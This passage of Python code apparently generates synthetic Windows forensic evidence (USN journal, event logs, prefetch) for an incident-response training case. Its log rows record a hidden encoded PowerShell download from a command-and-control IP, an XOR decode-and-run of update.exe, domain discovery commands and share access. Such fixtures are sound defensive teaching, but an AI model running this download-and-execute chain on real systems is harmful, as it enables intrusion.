        # The decode block writes b.tmp in one WriteAllBytes call, then
        # removes a.tmp. b.tmp takes MFT record 22417, which keeps that
        # number when Move-Item renames it to update.exe.
        (None, 22417, 2546, "b.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:20:11", "FileCreate"),
        (None, 22417, 2546, "b.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:20:11", "DataExtend"),
        (None, 22417, 2546, "b.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:20:11.0500000", "DataExtend|FileClose"),
        (None, 22421, 2546, "a.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:20:11.1000000", "FileDelete|FileClose"),
        (None, 22417, 2546, "b.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:20:11.2500000", "RenameOldName"),
        (1432904384, 22417, 2546, "update.exe", "exe",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:20:11.5000000", "RenameNewName"),
        (None, 22417, 2546, "update.exe", "exe",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:20:11.5000000", "RenameNewName|FileClose"),
        (None, 22417, 2546, "update.exe", "exe",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:21:03", "BasicInfoChange"),
        (None, 6425, 6422, "UPDATE.EXE-89A4B22C.pf", "pf",
         "Windows\\System32\\Prefetch",
         "2024-11-14 14:21:03", "FileCreate|DataExtend"),
        (None, 6425, 6422, "UPDATE.EXE-89A4B22C.pf", "pf",
         "Windows\\System32\\Prefetch",
         "2024-11-14 14:21:03.5000000", "FileClose"),
        (None, 17422, 2546, "~DF89C2AB.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-13 09:14:00", "FileCreate|DataExtend"),
        (None, 17422, 2546, "~DF89C2AB.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-13 09:14:03", "FileDelete|FileClose"),
        (1432907520, 22417, 2546, "update.exe", "exe",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:23:44", "FileDelete"),
        (None, 22417, 2546, "update.exe", "exe",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:23:44.5000000", "FileClose"),
        (None, 22418, 2546, "~$Q4_Payroll_Review.xlsm", "xlsm",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 14:24:18", "FileDelete|FileClose"),
        (None, 2218, 2105, "NTUSER.DAT", "DAT",
         f"Users\\{USER}",
         "2024-11-14 14:31:05", "DataExtend"),
        (None, 2218, 2105, "NTUSER.DAT", "DAT",
         f"Users\\{USER}",
         "2024-11-14 14:31:05.5000000", "DataExtend"),
        (None, 1292, 1291, "Security.evtx", "evtx",
         "Windows\\System32\\winevt\\Logs",
         "2024-11-14 14:31:05", "DataExtend"),
        (None, 1292, 1291, "Security.evtx", "evtx",
         "Windows\\System32\\winevt\\Logs",
         "2024-11-14 14:33:18", "DataExtend"),
        (None, 1294, 1291,
         "Microsoft-Windows-PowerShell%4Operational.evtx", "evtx",
         "Windows\\System32\\winevt\\Logs",
         "2024-11-14 14:21:03", "DataExtend"),
        # Background "noise" — benign housekeeping
        (None, 9422, 2208, "Q3_Payroll_Final.xlsx", "xlsx",
         f"Users\\{USER}\\Documents",
         "2024-11-08 10:05:33", "BasicInfoChange"),
        (None, 9423, 2208, "Vendor_Notes.docx", "docx",
         f"Users\\{USER}\\Documents",
         "2024-11-13 09:14:00", "BasicInfoChange"),
        (None, 9424, 2208, "Pay_Schedule_Q4.xlsx", "xlsx",
         f"Users\\{USER}\\Documents",
         "2024-11-13 13:14:33", "BasicInfoChange"),
        (None, 14108, 2209, "timesheet_template.xlsx", "xlsx",
         f"Users\\{USER}\\Downloads",
         "2024-10-22 13:18:00", "FileCreate|DataExtend|FileClose"),
        (None, 14109, 2209, "benefits_2025.pdf", "pdf",
         f"Users\\{USER}\\Downloads",
         "2024-11-08 10:42:00", "FileCreate|DataExtend|FileClose"),
        (None, 14111, 2210, "Notes.txt", "txt",
         f"Users\\{USER}\\Desktop",
         "2024-11-13 13:42:00", "DataOverwrite|FileClose"),
        (None, 4321, 4318, "Vendor_Notes.lnk", "lnk",
         f"Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
         "2024-11-13 09:14:00", "BasicInfoChange"),
        (None, 4322, 4318, "Pay_Schedule_Q4.lnk", "lnk",
         f"Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
         "2024-11-13 13:14:33", "BasicInfoChange"),
        (None, 4320, 4318, "Q3_Payroll_Final.lnk", "lnk",
         f"Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
         "2024-11-08 10:05:33", "BasicInfoChange"),
        (None, 1306, 1305, "SRUDB.dat", "dat",
         "Windows\\System32\\sru",
         "2024-11-14 14:30:00", "DataExtend"),
        (None, 1309, 1308, "Amcache.hve", "hve",
         "Windows\\AppCompat\\Programs",
         "2024-11-14 14:21:03", "DataExtend"),
        (None, 2218, 2105, "NTUSER.DAT", "DAT",
         f"Users\\{USER}",
         "2024-11-14 14:18:55.5000000", "DataExtend"),
        (None, 9427, 2550,
         f"{USER}@finance.local.ost", "ost",
         f"Users\\{USER}\\AppData\\Local\\Microsoft\\Outlook",
         "2024-11-14 14:19:38", "DataExtend"),
        (None, 1297, 1295, "SYSTEM", "",
         "Windows\\System32\\config",
         "2024-11-14 03:02:11", "DataExtend"),
        (None, 1296, 1295, "SOFTWARE", "",
         "Windows\\System32\\config",
         "2024-11-14 03:02:11", "DataExtend"),
        (None, 17423, 2546, "~DF45B89A.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 11:14:23", "FileCreate"),
        (None, 17423, 2546, "~DF45B89A.tmp", "tmp",
         f"Users\\{USER}\\AppData\\Local\\Temp",
         "2024-11-14 11:14:24", "FileDelete|FileClose"),
    ]
    # Reference the unused base/next_usn helpers to keep them around for
    # contributors who want to extend with extra noise rows.
    _ = base, next_usn, rng

    # A USN is the record's byte offset in $J, so USNs must rise with time.
    # Only two values are cited in the book: 1,432,904,384 (RenameNewName
    # update.exe) and 1,432,907,520 (FileDelete update.exe). Every row with
    # a USN of None is placed on a constant journal write rate fitted to
    # those two anchors (about 14.8 bytes/s, roughly 1.3 MB/day), then
    # nudged so that no record overlaps the one before it.
    def when(t: str) -> datetime:                  # keeps the fraction
        return datetime.strptime(ts(t)[:26], "%Y-%m-%d %H:%M:%S.%f")

    def reclen(name: str) -> int:
        return (60 + 2 * len(name) + 7) // 8 * 8   # USN_RECORD_V2, 8-aligned

    order = sorted(range(len(entries)),
                   key=lambda i: (when(entries[i][6]), i))
    anchors = [i for i in order if entries[i][0] is not None]
    assert len(anchors) == 2
    a1, a2 = anchors[0], anchors[-1]
    t1, u1 = when(entries[a1][6]), entries[a1][0]
    t2, u2 = when(entries[a2][6]), entries[a2][0]
    rate = (u2 - u1) / (t2 - t1).total_seconds()
    usn = {i: entries[i][0] for i in anchors}

    def ideal(i: int) -> int:
        dt = (when(entries[i][6]) - t1).total_seconds()
        return int(u1 + rate * dt) // 8 * 8

    pos = {i: k for k, i in enumerate(order)}
    for k in range(pos[a1] - 1, -1, -1):          # backwards from anchor 1
        i, nxt = order[k], order[k + 1]
        usn[i] = min(ideal(i), usn[nxt] - reclen(entries[i][3])) // 8 * 8
    for k in range(pos[a1] + 1, len(order)):      # forwards from anchor 1
        i, prv = order[k], order[k - 1]
        if i in anchors:
            assert usn[prv] + reclen(entries[prv][3]) <= usn[i]
            continue
        usn[i] = max(ideal(i), usn[prv] + reclen(entries[prv][3]))
        usn[i] = (usn[i] + 7) // 8 * 8

    for i in order:
        _, entry, parent, name, ext, ppath, t, reasons = entries[i]
        add(usn[i], entry, parent, name, ext, ppath, t, reasons)
    return rows


def generate_security_evtx(rng: random.Random) -> List[Dict[str, str]]:
    """Security event log: process creation chain + logons."""
    rows: List[Dict[str, str]] = []

    def add(rec, t, eid, user, desc, payload):
        rows.append({
            "RecordNumber": str(rec), "TimeCreated": ts(t),
            "EventID": str(eid), "Channel": "Security",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "Computer": FQDN, "UserName": user, "Level": "Information",
            "Description": desc, "Payload": payload,
        })

    # Hand-coded events preserving the timeline.
    add(4382011, "2024-11-14 03:02:11.1248421", 4624, "SYSTEM",
        "Successful logon",
        "TargetUserName=SYSTEM TargetDomainName=NT AUTHORITY LogonType=5 "
        "LogonProcessName=Advapi ProcessName=C:\\Windows\\System32\\services.exe "
        "IpAddress=- ElevatedToken=Yes")
    add(4382012, "2024-11-14 03:02:11.4214821", 4672, "SYSTEM",
        "Special privileges assigned",
        "SubjectUserName=SYSTEM PrivilegeList=SeAssignPrimaryTokenPrivilege "
        "SeTcbPrivilege SeSecurityPrivilege SeTakeOwnershipPrivilege "
        "SeLoadDriverPrivilege")
    add(4382108, "2024-11-14 08:43:17.4842311", 4624, "SYSTEM",
        "Successful logon",
        f"TargetUserName={USER} TargetDomainName={DOMAIN} LogonType=2 "
        "LogonProcessName=User32 ProcessName=C:\\Windows\\System32\\winlogon.exe "
        f"IpAddress=127.0.0.1 WorkstationName={HOSTNAME}")
    add(4382109, "2024-11-14 08:43:17.5012834", 4672, USER,
        "Special privileges assigned",
        f"SubjectUserName={USER} SubjectDomainName={DOMAIN} "
        "PrivilegeList=SeShutdownPrivilege SeUndockPrivilege "
        "SeIncreaseWorkingSetPrivilege SeTimeZonePrivilege")
    add(4382144, "2024-11-14 08:43:42.1224821", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Windows\\Explorer.EXE ProcessId=0x1A2C "
        f"SubjectUserName={USER} ParentProcessName=C:\\Windows\\System32\\userinit.exe "
        "TokenElevationType=%%1936 CommandLine=C:\\Windows\\Explorer.EXE")
    add(4382188, "2024-11-14 08:48:14.0124211", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE "
        f"ProcessId=0x2148 SubjectUserName={USER} "
        "ParentProcessName=C:\\Windows\\Explorer.EXE TokenElevationType=%%1938 "
        'CommandLine="C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"')
    add(4382214, "2024-11-14 09:32:11.4218421", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE "
        f"ProcessId=0x3024 SubjectUserName={USER} "
        "ParentProcessName=C:\\Windows\\Explorer.EXE TokenElevationType=%%1938 "
        'CommandLine="C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" /e')
    add(4382284, "2024-11-14 11:14:22.4214211", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE "
        f"ProcessId=0x3F88 SubjectUserName={USER} "
        "ParentProcessName=C:\\Windows\\Explorer.EXE TokenElevationType=%%1938 "
        'CommandLine="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n /dde')
    add(4382401, "2024-11-14 13:42:11", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Windows\\System32\\NOTEPAD.EXE ProcessId=0x4218 "
        f"SubjectUserName={USER} ParentProcessName=C:\\Windows\\Explorer.EXE "
        'TokenElevationType=%%1938 CommandLine="C:\\Windows\\System32\\NOTEPAD.EXE" '
        f"C:\\Users\\{USER}\\Desktop\\Notes.txt")
    # Lure open and PowerShell spawn by Outlook.
    add(4382442, "2024-11-14 14:18:55.0214821", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE "
        f"ProcessId=0x4844 SubjectUserName={USER} "
        "ParentProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE "
        'TokenElevationType=%%1938 CommandLine="C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" /dde')
    encoded_ps = (
        "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAg"
        "ACcAaAB0AHQAcABzADoALwAvADkAMQAuADIAMQA0AC4ANAA3AC4AMgAyAC8A"
        "aAAvAHUALgB0ACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGUAbgB2ADoAVABF"
        "AE0AUABcAGEALgB0AG0AcAA="
    )
    add(4382451, "2024-11-14 14:19:38.4218921", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
        f"ProcessId=0x5128 SubjectUserName={USER} "
        "ParentProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE "
        'TokenElevationType=%%1938 CommandLine="powershell.exe" -NoProfile '
        f"-WindowStyle Hidden -EncodedCommand {encoded_ps}")
    add(4382452, "2024-11-14 14:19:38.5811542", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Windows\\System32\\cmd.exe ProcessId=0x5184 "
        f"SubjectUserName={USER} "
        "ParentProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
        'TokenElevationType=%%1938 CommandLine="cmd.exe" /c whoami /all')
    add(4382454, "2024-11-14 14:19:42.0124581", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Windows\\System32\\conhost.exe ProcessId=0x5188 "
        f"SubjectUserName={USER} "
        "ParentProcessName=C:\\Windows\\System32\\cmd.exe TokenElevationType=%%1938 "
        "CommandLine=\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1")
    add(4382468, "2024-11-14 14:21:03.4214582", 4688, USER,
        "Process created",
        f"NewProcessName=C:\\Users\\{USER}\\AppData\\Local\\Temp\\update.exe "
        f"ProcessId=0x5421 SubjectUserName={USER} "
        "ParentProcessName=C:\\Windows\\System32\\cmd.exe TokenElevationType=%%1938 "
        f'CommandLine="C:\\Users\\{USER}\\AppData\\Local\\Temp\\update.exe"')
    # Inbound logon and lateral move.
    add(4382514, "2024-11-14 14:31:05.4218421", 4624, "SYSTEM",
        "Successful logon",
        f"TargetUserName={USER} TargetDomainName={DOMAIN} LogonType=3 "
        "LogonProcessName=NtLmSsp ProcessName=- "
        f"IpAddress={ADVERSARY_INBOUND_IP} WorkstationName={HOSTNAME}")
    add(4382518, "2024-11-14 14:33:18.4218421", 4648, USER,
        "Logon attempted with explicit credentials",
        f"SubjectUserName={USER} SubjectDomainName={DOMAIN} "
        f"TargetUserName={USER} TargetDomainName={DOMAIN} "
        f"TargetServerName={FILESERVER} IpAddress={FILESERVER_IP} "
        "ProcessName=C:\\Windows\\System32\\cmd.exe")
    add(4382519, "2024-11-14 14:33:19.0124211", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Windows\\System32\\net.exe ProcessId=0x6024 "
        f"SubjectUserName={USER} ParentProcessName=C:\\Windows\\System32\\cmd.exe "
        f"TokenElevationType=%%1938 CommandLine=net use \\\\{FILESERVER}\\Finance$ "
        f"/user:{DOMAIN}\\{USER}")
    add(4382520, "2024-11-14 14:33:42.4218421", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Windows\\System32\\net1.exe ProcessId=0x6028 "
        f"SubjectUserName={USER} ParentProcessName=C:\\Windows\\System32\\net.exe "
        "TokenElevationType=%%1938 CommandLine=C:\\Windows\\system32\\net1 use "
        f"\\\\{FILESERVER}\\Finance$ /user:{DOMAIN}\\{USER}")

    # Noise events (failed logons, scheduled tasks, benign processes).
    add(4381942, "2024-11-14 02:14:08.4218421", 4625, "SYSTEM",
        "Failed logon",
        f"TargetUserName={USER} TargetDomainName={DOMAIN} LogonType=3 "
        f"IpAddress={BACKUP_IP} FailureReason=%%2313 Status=0xC000006D "
        f"SubStatus=0xC000006A WorkstationName={BACKUP_HOST}")
    add(4381958, "2024-11-14 02:14:14", 4624, "SYSTEM",
        "Successful logon",
        f"TargetUserName=svc-backup TargetDomainName={DOMAIN} LogonType=3 "
        f"LogonProcessName=Kerberos ProcessName=- IpAddress={BACKUP_IP} "
        f"WorkstationName={BACKUP_HOST}")
    add(4381962, "2024-11-14 02:14:48", 4634, "SYSTEM",
        "Logoff",
        "TargetUserName=svc-backup LogonType=3")
    add(4382002, "2024-11-14 03:00:11", 4688, "SYSTEM",
        "Process created",
        "NewProcessName=C:\\Windows\\System32\\svchost.exe ProcessId=0x12C8 "
        "SubjectUserName=SYSTEM ParentProcessName=C:\\Windows\\System32\\services.exe "
        "CommandLine=C:\\Windows\\System32\\svchost.exe -k netsvcs -p")
    add(4382140, "2024-11-14 08:43:42", 4624, "SYSTEM",
        "Successful logon",
        "TargetUserName=DWM-1 TargetDomainName=Window Manager LogonType=2 "
        "LogonProcessName=Advapi ProcessName=C:\\Windows\\System32\\winlogon.exe")
    add(4382284, "2024-11-14 12:00:11", 4688, "SYSTEM",
        "Process created",
        "NewProcessName=C:\\Windows\\System32\\backgroundTaskHost.exe "
        f"ProcessId=0x3142 SubjectUserName={USER} "
        "ParentProcessName=C:\\Windows\\System32\\svchost.exe "
        'CommandLine="C:\\Windows\\system32\\backgroundTaskHost.exe" '
        "-ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca")
    add(4382318, "2024-11-14 12:32:04", 4688, "SYSTEM",
        "Process created",
        "NewProcessName=C:\\Program Files\\Microsoft\\EdgeWebView\\Application\\msedgewebview2.exe "
        f"ProcessId=0x3848 SubjectUserName={USER} "
        "ParentProcessName=C:\\Windows\\Explorer.EXE "
        'CommandLine="C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\msedgewebview2.exe"')
    add(4382386, "2024-11-14 13:14:00", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE "
        f"ProcessId=0x3F88 SubjectUserName={USER} "
        "ParentProcessName=C:\\Windows\\Explorer.EXE "
        'CommandLine="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n')
    add(4382522, "2024-11-14 14:38:00", 4634, "SYSTEM",
        "Logoff",
        f"TargetUserName={USER} LogonType=3 IpAddress={ADVERSARY_INBOUND_IP}")
    add(4382388, "2024-11-14 13:14:21", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE "
        f"ProcessId=0x4022 SubjectUserName={USER} "
        "ParentProcessName=C:\\Windows\\Explorer.EXE "
        'CommandLine="C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" /e')

    # update.exe-driven discovery.
    add(4382469, "2024-11-14 14:21:48", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Windows\\System32\\ipconfig.exe ProcessId=0x5482 "
        f"SubjectUserName={USER} "
        f"ParentProcessName=C:\\Users\\{USER}\\AppData\\Local\\Temp\\update.exe "
        "CommandLine=ipconfig /all")
    add(4382470, "2024-11-14 14:21:55", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Windows\\System32\\nltest.exe ProcessId=0x5488 "
        f"SubjectUserName={USER} "
        f"ParentProcessName=C:\\Users\\{USER}\\AppData\\Local\\Temp\\update.exe "
        "CommandLine=nltest /domain_trusts")
    add(4382471, "2024-11-14 14:22:14", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Windows\\System32\\net.exe ProcessId=0x5494 "
        f"SubjectUserName={USER} "
        f"ParentProcessName=C:\\Users\\{USER}\\AppData\\Local\\Temp\\update.exe "
        'CommandLine=net group "Domain Admins" /domain')
    add(4382472, "2024-11-14 14:22:42", 4688, USER,
        "Process created",
        "NewProcessName=C:\\Windows\\System32\\arp.exe ProcessId=0x5502 "
        f"SubjectUserName={USER} "
        f"ParentProcessName=C:\\Users\\{USER}\\AppData\\Local\\Temp\\update.exe "
        "CommandLine=arp -a")
    add(4382410, "2024-11-14 14:00:14", 4624, "SYSTEM",
        "Successful logon",
        f"TargetUserName={USER} TargetDomainName={DOMAIN} LogonType=11 "
        f"LogonProcessName=NtLmSsp IpAddress=- WorkstationName={HOSTNAME}")
    add(4382517, "2024-11-14 14:33:00", 4798, USER,
        "User local group membership enumerated",
        f"SubjectUserName={USER} TargetUserName={USER} "
        f"TargetDomainName={DOMAIN} CallerProcessName="
        f"C:\\Users\\{USER}\\AppData\\Local\\Temp\\update.exe")
    # Brute-force noise from external IP.
    for rec, t, target in [
        (4382044, "2024-11-14 04:00:00", "admin"),
        (4382045, "2024-11-14 04:00:11", "administrator"),
        (4382046, "2024-11-14 04:00:24", "root"),
        (4382047, "2024-11-14 04:00:42", "svc-admin"),
    ]:
        add(rec, t, 4625, "SYSTEM",
            "Failed logon",
            f"TargetUserName={target} TargetDomainName={DOMAIN} "
            f"LogonType=3 IpAddress={BRUTE_IP} FailureReason=%%2313 "
            "Status=0xC000006D SubStatus=0xC0000064")

    return rows


def generate_system_evtx(rng: random.Random) -> List[Dict[str, str]]:
    """System event log: services, time service, npcap install."""
    rows: List[Dict[str, str]] = []

    def add(rec, t, eid, provider, level, desc, payload):
        rows.append({
            "RecordNumber": str(rec), "TimeCreated": ts(t),
            "EventID": str(eid), "Channel": "System", "Provider": provider,
            "Computer": FQDN, "Level": level,
            "Description": desc, "Payload": payload,
        })

    add(214221, "2024-11-14 03:00:00", 7036, "Service Control Manager",
        "Information", "Service state changed",
        "ServiceName=Windows Update State=Running")
    add(214222, "2024-11-14 03:02:11", 7036, "Service Control Manager",
        "Information", "Service state changed",
        "ServiceName=Background Intelligent Transfer Service State=Running")
    add(214223, "2024-11-14 03:42:18", 7036, "Service Control Manager",
        "Information", "Service state changed",
        "ServiceName=Windows Update State=Stopped")
    add(214224, "2024-11-14 03:42:21", 7036, "Service Control Manager",
        "Information", "Service state changed",
        "ServiceName=Background Intelligent Transfer Service State=Stopped")
    add(214225, "2024-11-14 06:00:11", 1, "Microsoft-Windows-Time-Service",
        "Information", "Time service synchronized",
        "Source=time.windows.com Offset=+0.124s")
    add(214226, "2024-11-14 08:43:11", 7036, "Service Control Manager",
        "Information", "Service state changed",
        "ServiceName=User Profile Service State=Running")
    add(214227, "2024-11-14 08:43:14", 7036, "Service Control Manager",
        "Information", "Service state changed",
        "ServiceName=Windows Search State=Running")
    add(214228, "2024-11-14 11:14:22", 7036, "Service Control Manager",
        "Information", "Service state changed",
        "ServiceName=ClickToRun Service State=Running")
    add(214229, "2024-11-14 13:14:00", 7036, "Service Control Manager",
        "Information", "Service state changed",
        "ServiceName=ClickToRun Service State=Stopped")
    add(214231, "2024-11-14 14:18:55", 7036, "Service Control Manager",
        "Information", "Service state changed",
        "ServiceName=ClickToRun Service State=Running")
    add(214232, "2024-11-14 14:30:04", 7036, "Service Control Manager",
        "Information", "Service state changed",
        "ServiceName=Diagnostic Service Host State=Running")
    add(214233, "2024-11-14 14:30:08", 7036, "Service Control Manager",
        "Information", "Service state changed",
        "ServiceName=Diagnostic Service Host State=Stopped")
    add(214230, "2024-11-14 13:55:00", 1,
        "Microsoft-Windows-Kernel-General", "Information",
        "The system time has changed",
        "NewTime=2024-11-14 13:55:00 OldTime=2024-11-14 13:54:58 "
        "Reason=An application or system component changed the time "
        "ProcessName=C:\\Windows\\System32\\svchost.exe")
    add(214216, "2024-11-13 22:00:00", 1074, "USER32", "Information",
        "System shutdown initiated",
        "Process=C:\\Windows\\System32\\winlogon.exe User=NT AUTHORITY\\SYSTEM "
        "Reason=Operating System: Service pack (Planned)")
    add(214217, "2024-11-13 22:00:14", 6006, "EventLog", "Information",
        "Event log service stopped", "")
    # Kernel-General 12 carries the OS start time, so it precedes the
    # EventLog service's own 6005 start record.
    add(214218, "2024-11-14 02:13:48", 12, "Microsoft-Windows-Kernel-General",
        "Information", "System started",
        "StartTime=2024-11-14 02:13:48")
    add(214219, "2024-11-14 02:14:00", 6005, "EventLog", "Information",
        "Event log service started", "")
    add(214220, "2024-11-14 02:14:18", 7045, "Service Control Manager",
        "Information", "Service installed",
        "ServiceName=npcap "
        "ServiceFileName=\\??\\C:\\Windows\\System32\\drivers\\npcap.sys "
        "ServiceType=kernel mode driver StartType=demand start "
        "AccountName=LocalSystem")

    return rows


def generate_powershell_evtx(rng: random.Random) -> List[Dict[str, str]]:
    """PowerShell Operational log: encoded download / decode / launch."""
    rows: List[Dict[str, str]] = []

    def add(rec, t, eid, level, desc, payload):
        rows.append({
            "RecordNumber": str(rec), "TimeCreated": ts(t),
            "EventID": str(eid),
            "Channel": "Microsoft-Windows-PowerShell/Operational"
                if eid != 400 else "Windows PowerShell",
            "Provider": "Microsoft-Windows-PowerShell"
                if eid != 400 else "PowerShell",
            "Computer": FQDN, "UserName": USER, "Level": level,
            "Description": desc, "Payload": payload,
        })

    add(824211, "2024-11-14 14:19:38.4218921", 4103, "Information",
        "Module logging — pipeline execution",
        "ContextInfo=Severity = Informational Host Name = ConsoleHost "
        "Host Version = 5.1.19041.5247 Host ID = a4218421-... "
        "Engine Version = 5.1.19041.5247 ScriptName= "
        f"UserId = {DOMAIN}\\{USER}")
    add(824212, "2024-11-14 14:19:38.4842184", 4104, "Warning",
        "Script block compilation",
        "MessageNumber=1 MessageTotal=1 ScriptBlockText=Invoke-WebRequest "
        f"-Uri 'https://{C2_IP}/h/u.t' -OutFile $env:TEMP\\a.tmp "
        "ScriptBlockId=4218a421-1142-4218-9421-421842184214 Path=")
    add(824215, "2024-11-14 14:20:07.6000000", 4104, "Warning",
        "Script block compilation",
        "MessageNumber=1 MessageTotal=1 ScriptBlockText=$bytes = "
        "Get-Content $env:TEMP\\a.tmp -Encoding Byte; "
        "$key = 'F1nd4nc3K3y!'; for($i=0; $i -lt $bytes.Length; $i++)"
        "{ $bytes[$i] = $bytes[$i] -bxor $key[$i % $key.Length] }; "
        "[IO.File]::WriteAllBytes($env:TEMP\\b.tmp, $bytes); "
        "Remove-Item $env:TEMP\\a.tmp "
        "ScriptBlockId=4218a421-1142-4218-9421-421842184215 Path=")
    add(824216, "2024-11-14 14:20:11.2000000", 4104, "Warning",
        "Script block compilation",
        "MessageNumber=1 MessageTotal=1 ScriptBlockText=Move-Item "
        "$env:TEMP\\b.tmp $env:TEMP\\update.exe -Force "
        "ScriptBlockId=4218a421-1142-4218-9421-421842184216 Path=")
    add(824217, "2024-11-14 14:21:02.5000000", 4104, "Warning",
        "Script block compilation",
        "MessageNumber=1 MessageTotal=1 ScriptBlockText=Start-Process "
        "$env:TEMP\\update.exe "
        "ScriptBlockId=4218a421-1142-4218-9421-421842184217 Path=")
    add(824213, "2024-11-14 14:19:38.5000000", 4105, "Information",
        "Script started",
        "CommandName=Invoke-WebRequest CommandType=Cmdlet ScriptName=")
    add(824214, "2024-11-14 14:19:48.1000000", 4106, "Information",
        "Script stopped", "CommandName=Invoke-WebRequest")
    add(824210, "2024-11-14 09:32:11", 4104, "Information",
        "Script block compilation",
        "MessageNumber=1 MessageTotal=1 ScriptBlockText=Get-Process | "
        "Sort-Object -Property CPU -Descending | Select-Object -First 10 "
        "ScriptBlockId=11118421-1142-4218-9421-1118421842184 Path=")
    add(824209, "2024-11-12 09:32:00", 400, "Information",
        "Engine state changed from None to Available",
        "NewEngineState=Available PreviousEngineState=None HostName=ConsoleHost "
        "HostVersion=5.1.19041.5247 "
        "HostId=a4218421-1142-4218-9421-421842184211 "
        "EngineVersion=5.1.19041.5247 "
        "RunspaceId=11118421-1142-4218-9421-1118421842185 PipelineId=")
    return rows


def generate_prefetch(rng: random.Random) -> List[Dict[str, str]]:
    """Prefetch entries — update.exe RunCount=1 is the headline indicator."""
    rows: List[Dict[str, str]] = []

    def add(name, exe, h, runs, last, p0, p1, p2, files):
        rows.append({
            "SourceFilename": name, "ExecutableName": exe, "Hash": h,
            "RunCount": str(runs), "LastRun": ts(last) if last else "",
            "PreviousRun0": ts(p0) if p0 else "",
            "PreviousRun1": ts(p1) if p1 else "",
            "PreviousRun2": ts(p2) if p2 else "",
            "FilesCount": str(files), "VolumeName": VOL_GUID,
            "VolumeSerialNumber": VOL_SERIAL,
            "VolumeCreated": ts("2024-09-12 09:18:42"),
        })

    add("POWERSHELL.EXE-022A1141.pf", "POWERSHELL.EXE", "022A1141", 3,
        "2024-11-14 14:19:38", "2024-11-12 09:32:00",
        "2024-09-19 14:42:11", "", 184)
    add("CMD.EXE-4A81B364.pf", "CMD.EXE", "4A81B364", 8,
        "2024-11-14 14:33:19.0000000", "2024-11-14 14:19:38.5000000",
        "2024-11-08 11:14:21", "2024-10-22 09:14:08", 42)
    add("UPDATE.EXE-89A4B22C.pf", "UPDATE.EXE", "89A4B22C", 1,
        "2024-11-14 14:21:03", "", "", "", 28)
    add("WINWORD.EXE-89B23C41.pf", "WINWORD.EXE", "89B23C41", 42,
        "2024-11-14 13:14:00", "2024-11-14 11:14:22",
        "2024-11-13 09:14:00", "2024-11-08 14:18:00", 184)
    add("EXCEL.EXE-7A4B8C12.pf", "EXCEL.EXE", "7A4B8C12", 68,
        "2024-11-14 14:18:55", "2024-11-14 13:14:21",
        "2024-11-14 09:32:11", "2024-11-13 13:14:33", 221)
    add("OUTLOOK.EXE-3D2A41C8.pf", "OUTLOOK.EXE", "3D2A41C8", 184,
        "2024-11-14 14:19:38", "2024-11-14 08:48:14",
        "2024-11-13 08:42:11", "2024-11-12 08:42:11", 322)
    add("NOTEPAD.EXE-D7BA5828.pf", "NOTEPAD.EXE", "D7BA5828", 12,
        "2024-11-14 13:42:11", "2024-11-13 11:14:00",
        "2024-11-08 13:42:00", "", 21)
